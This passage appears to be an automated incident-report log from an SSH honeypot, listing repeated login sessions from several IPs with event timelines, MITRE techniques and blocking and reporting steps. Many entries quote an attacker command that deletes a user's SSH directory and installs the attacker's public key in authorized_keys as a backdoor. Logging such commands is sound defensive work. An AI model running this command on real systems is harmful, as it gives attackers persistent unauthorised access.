| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:05 |
| **Last Seen** | 2026-06-05 14:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:05:05` | `cowrie.session.connect` |
| `2026-06-05 14:05:05` | `cowrie.client.version` |
| `2026-06-05 14:05:05` | `cowrie.client.kex` |
| `2026-06-05 14:05:06` | `cowrie.login.success` |
| `2026-06-05 14:05:06` | `cowrie.session.params` |
| `2026-06-05 14:05:06` | `cowrie.command.input` |
| `2026-06-05 14:05:06` | `cowrie.command.failed` |
| `2026-06-05 14:05:07` | `cowrie.log.closed` |
| `2026-06-05 14:05:07` | `cowrie.session.params` |
| `2026-06-05 14:05:07` | `cowrie.command.input` |
| `2026-06-05 14:05:07` | `cowrie.session.file_download` |
| `2026-06-05 14:05:07` | `cowrie.log.closed` |
| `2026-06-05 14:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4718a14fbe

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:05 |
| **Last Seen** | 2026-06-05 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:05:09` | `cowrie.session.connect` |
| `2026-06-05 14:05:09` | `cowrie.client.version` |
| `2026-06-05 14:05:10` | `cowrie.client.kex` |
| `2026-06-05 14:05:10` | `cowrie.login.success` |
| `2026-06-05 14:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-064c89281708

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:06 |
| **Last Seen** | 2026-06-05 14:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:06:39` | `cowrie.session.connect` |
| `2026-06-05 14:06:39` | `cowrie.client.version` |
| `2026-06-05 14:06:39` | `cowrie.client.kex` |
| `2026-06-05 14:06:40` | `cowrie.login.success` |
| `2026-06-05 14:06:40` | `cowrie.session.params` |
| `2026-06-05 14:06:40` | `cowrie.command.input` |
| `2026-06-05 14:06:40` | `cowrie.command.failed` |
| `2026-06-05 14:06:40` | `cowrie.log.closed` |
| `2026-06-05 14:06:41` | `cowrie.session.params` |
| `2026-06-05 14:06:41` | `cowrie.command.input` |
| `2026-06-05 14:06:41` | `cowrie.session.file_download` |
| `2026-06-05 14:06:41` | `cowrie.log.closed` |
| `2026-06-05 14:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a4577450a5

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:06 |
| **Last Seen** | 2026-06-05 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:06:43` | `cowrie.session.connect` |
| `2026-06-05 14:06:43` | `cowrie.client.version` |
| `2026-06-05 14:06:43` | `cowrie.client.kex` |
| `2026-06-05 14:06:44` | `cowrie.login.success` |
| `2026-06-05 14:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e2a87c4151

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:14 |
| **Last Seen** | 2026-06-05 14:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:14:09` | `cowrie.session.connect` |
| `2026-06-05 14:14:09` | `cowrie.client.version` |
| `2026-06-05 14:14:09` | `cowrie.client.kex` |
| `2026-06-05 14:14:10` | `cowrie.login.success` |
| `2026-06-05 14:14:10` | `cowrie.session.params` |
| `2026-06-05 14:14:10` | `cowrie.command.input` |
| `2026-06-05 14:14:10` | `cowrie.command.failed` |
| `2026-06-05 14:14:10` | `cowrie.log.closed` |
| `2026-06-05 14:14:11` | `cowrie.session.params` |
| `2026-06-05 14:14:11` | `cowrie.command.input` |
| `2026-06-05 14:14:11` | `cowrie.session.file_download` |
| `2026-06-05 14:14:11` | `cowrie.log.closed` |
| `2026-06-05 14:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4a6beadf5e

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:14 |
| **Last Seen** | 2026-06-05 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:14:13` | `cowrie.session.connect` |
| `2026-06-05 14:14:13` | `cowrie.client.version` |
| `2026-06-05 14:14:13` | `cowrie.client.kex` |
| `2026-06-05 14:14:14` | `cowrie.login.success` |
| `2026-06-05 14:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca78c7b2a4b

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-06-05 14:28 |
| **Last Seen** | 2026-06-05 14:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:28:12` | `cowrie.session.connect` |
| `2026-06-05 14:28:12` | `cowrie.client.version` |
| `2026-06-05 14:28:12` | `cowrie.client.kex` |
| `2026-06-05 14:28:13` | `cowrie.login.success` |
| `2026-06-05 14:28:13` | `cowrie.session.params` |
| `2026-06-05 14:28:13` | `cowrie.command.input` |
| `2026-06-05 14:28:13` | `cowrie.command.failed` |
| `2026-06-05 14:28:13` | `cowrie.log.closed` |
| `2026-06-05 14:28:13` | `cowrie.session.params` |
| `2026-06-05 14:28:13` | `cowrie.command.input` |
| `2026-06-05 14:28:13` | `cowrie.session.file_download` |
| `2026-06-05 14:28:13` | `cowrie.log.closed` |
| `2026-06-05 14:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efef2a78f19b

| Field | Detail |
|---|---|
| **Source IP** | `202.70.78[.]237` |
| **First Seen** | 2026-06-05 14:28 |
| **Last Seen** | 2026-06-05 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:28:14` | `cowrie.session.connect` |
| `2026-06-05 14:28:14` | `cowrie.client.version` |
| `2026-06-05 14:28:14` | `cowrie.client.kex` |
| `2026-06-05 14:28:15` | `cowrie.login.success` |
| `2026-06-05 14:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.70.78[.]237` to AbuseIPDB if not already reported
- [ ] Block `202.70.78[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449c1d8f2879

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-05 14:46 |
| **Last Seen** | 2026-06-05 14:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:46:21` | `cowrie.session.connect` |
| `2026-06-05 14:46:21` | `cowrie.client.version` |
| `2026-06-05 14:46:21` | `cowrie.client.kex` |
| `2026-06-05 14:46:22` | `cowrie.login.success` |
| `2026-06-05 14:46:23` | `cowrie.session.params` |
| `2026-06-05 14:46:23` | `cowrie.command.input` |
| `2026-06-05 14:46:23` | `cowrie.command.failed` |
| `2026-06-05 14:46:24` | `cowrie.log.closed` |
| `2026-06-05 14:46:24` | `cowrie.session.params` |
| `2026-06-05 14:46:24` | `cowrie.command.input` |
| `2026-06-05 14:46:24` | `cowrie.session.file_download` |
| `2026-06-05 14:46:24` | `cowrie.log.closed` |
| `2026-06-05 14:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c11a6efe36

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-05 14:46 |
| **Last Seen** | 2026-06-05 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:46:27` | `cowrie.session.connect` |
| `2026-06-05 14:46:27` | `cowrie.client.version` |
| `2026-06-05 14:46:27` | `cowrie.client.kex` |
| `2026-06-05 14:46:28` | `cowrie.login.success` |
| `2026-06-05 14:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f233bb153617

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:32 |
| **Last Seen** | 2026-06-05 15:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:32:34` | `cowrie.session.connect` |
| `2026-06-05 15:32:34` | `cowrie.client.version` |
| `2026-06-05 15:32:34` | `cowrie.client.kex` |
| `2026-06-05 15:32:34` | `cowrie.login.success` |
| `2026-06-05 15:32:34` | `cowrie.session.params` |
| `2026-06-05 15:32:34` | `cowrie.command.input` |
| `2026-06-05 15:32:34` | `cowrie.command.failed` |
| `2026-06-05 15:32:35` | `cowrie.log.closed` |
| `2026-06-05 15:32:35` | `cowrie.session.params` |
| `2026-06-05 15:32:35` | `cowrie.command.input` |
| `2026-06-05 15:32:35` | `cowrie.session.file_download` |
| `2026-06-05 15:32:35` | `cowrie.log.closed` |
| `2026-06-05 15:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b8c530fc36

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:32 |
| **Last Seen** | 2026-06-05 15:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:32:36` | `cowrie.session.connect` |
| `2026-06-05 15:32:36` | `cowrie.client.version` |
| `2026-06-05 15:32:36` | `cowrie.client.kex` |
| `2026-06-05 15:32:37` | `cowrie.login.success` |
| `2026-06-05 15:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4213ffb2e69c

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:38 |
| **Last Seen** | 2026-06-05 15:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:38:27` | `cowrie.session.connect` |
| `2026-06-05 15:38:27` | `cowrie.client.version` |
| `2026-06-05 15:38:27` | `cowrie.client.kex` |
| `2026-06-05 15:38:27` | `cowrie.login.success` |
| `2026-06-05 15:38:27` | `cowrie.session.params` |
| `2026-06-05 15:38:27` | `cowrie.command.input` |
| `2026-06-05 15:38:27` | `cowrie.command.failed` |
| `2026-06-05 15:38:27` | `cowrie.log.closed` |
| `2026-06-05 15:38:28` | `cowrie.session.params` |
| `2026-06-05 15:38:28` | `cowrie.command.input` |
| `2026-06-05 15:38:28` | `cowrie.session.file_download` |
| `2026-06-05 15:38:28` | `cowrie.log.closed` |
| `2026-06-05 15:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babefd348de0

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:38 |
| **Last Seen** | 2026-06-05 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:38:29` | `cowrie.session.connect` |
| `2026-06-05 15:38:29` | `cowrie.client.version` |
| `2026-06-05 15:38:29` | `cowrie.client.kex` |
| `2026-06-05 15:38:29` | `cowrie.login.success` |
| `2026-06-05 15:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1380d8d470c2

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 15:41 |
| **Last Seen** | 2026-06-05 15:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:41:25` | `cowrie.session.connect` |
| `2026-06-05 15:41:25` | `cowrie.client.version` |
| `2026-06-05 15:41:25` | `cowrie.client.kex` |
| `2026-06-05 15:41:26` | `cowrie.login.success` |
| `2026-06-05 15:41:27` | `cowrie.session.params` |
| `2026-06-05 15:41:27` | `cowrie.command.input` |
| `2026-06-05 15:41:27` | `cowrie.command.failed` |
| `2026-06-05 15:41:27` | `cowrie.log.closed` |
| `2026-06-05 15:41:27` | `cowrie.session.params` |
| `2026-06-05 15:41:27` | `cowrie.command.input` |
| `2026-06-05 15:41:27` | `cowrie.session.file_download` |
| `2026-06-05 15:41:27` | `cowrie.log.closed` |
| `2026-06-05 15:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079026ec0e6b

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-06-05 15:41 |
| **Last Seen** | 2026-06-05 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:41:30` | `cowrie.session.connect` |
| `2026-06-05 15:41:30` | `cowrie.client.version` |
| `2026-06-05 15:41:30` | `cowrie.client.kex` |
| `2026-06-05 15:41:31` | `cowrie.login.success` |
| `2026-06-05 15:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27de1a69f712

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 15:44 |
| **Last Seen** | 2026-06-05 15:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 15:44:12` | `cowrie.session.connect` |
| `2026-06-05 15:44:12` | `cowrie.client.version` |
